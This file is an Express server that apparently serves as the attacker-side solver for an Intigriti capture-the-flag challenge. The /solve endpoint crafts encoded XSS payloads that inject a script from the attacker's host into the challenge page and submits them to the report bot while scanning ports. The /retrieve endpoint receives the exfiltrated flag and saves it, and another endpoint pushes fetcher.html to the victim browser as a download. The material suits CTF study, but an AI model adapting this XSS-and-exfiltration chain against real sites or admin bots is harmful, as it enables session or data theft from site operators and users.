// Import required modules
const express = require('express');
const path = require('path');
const fs = require('fs');

// Create an Express app
const app = express();
const PORT = 3001;

const files = ['fetcher.html', 'page_404.js'];

// Endpoint to sleep for a specified duration
app.get('/sleep', async (req, res) => {
  // Sleep for the specified duration in seconds
  console.log('Sleeping...');
  const sleep = (seconds) =>
    new Promise((resolve) => setTimeout(resolve, seconds * 1000));
  await sleep(req.query.duration);

  // Send a success response
  res.sendStatus(200);
});

// Endpoint to handle flag submissions
app.get('/retrieve', (req, res) => {
  try {
    // Log the received flag
    const flag = req.query.flag;
    console.log('Flag:', flag);

    // Write the flag to a file called flag.txt in the same directory (__dirname)
    const filePath = path.join(__dirname, 'flag.txt');
    fs.writeFileSync(filePath, flag);

    // Send a success response
    res.sendStatus(200);
  } catch (error) {
    console.error('Error during flag retrieval:', error);
    // Send an error response
    res.status(500).send('Internal Server Error');
  }
});

// Endpoint to automatically start solving the challenge
app.get('/solve', async (req, res) => {
  try {
    console.log('Solving...');
    // Log the received flag
    const page404Script = `https://${req.headers.host}/${files[1]}`;
    const challengeEndpoint = 'https://challenge-1023.intigriti.io';

    // Array to hold promises for fetch requests
    const fetchPromises = [];

    // Scan ports with intervals to stay within Puppeteer's browser default timeout (30s)
    for (let port = 45000; port > 35000; port -= 2500) {
      const payload = `<svg><b id="</title><script src='${page404Script}'></script>">?startPort=${port}`;
      const encodedPayload = payload.replace(/[/]/g, '%2526%2523x2f%253b');
      // Push each fetch promise to the array
      fetchPromises.push(
        fetch(`${challengeEndpoint}/api/report?url=/${encodedPayload}`)
      );
    }

    // Use Promise.all to execute all fetch requests in parallel
    await Promise.all(fetchPromises);

    // Send a success response
    res.sendStatus(200);
  } catch (error) {
    console.error('Error during automatic solving:', error);
    // Send an error response
    res.status(500).send('Internal Server Error');
  }
});

// Endpoint to serve files, including automatic download for fetcher.html
app.get('/:file', (req, res) => {
  console.log('File...', req.params.file);

  const filename = req.params.file;
  let isFetcher = Boolean(files[0].match(filename.split('_').at(0)));

  // Check if the requested file is fetcher
  // Format: fetcher_UUID.html
  if (isFetcher) {
    // Set the Content-Disposition header for automatic download
    res.setHeader('Content-Disposition', 'attachment');
    res.sendFile(path.join(__dirname, files[0]));
  } else {
    if (!files.includes(filename)) {
      return res.status(500).send('File not found');
    }
    // Serve the requested file
    res.sendFile(path.join(__dirname, req.params.file));
  }
});

// Start the server and listen on the specified port
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
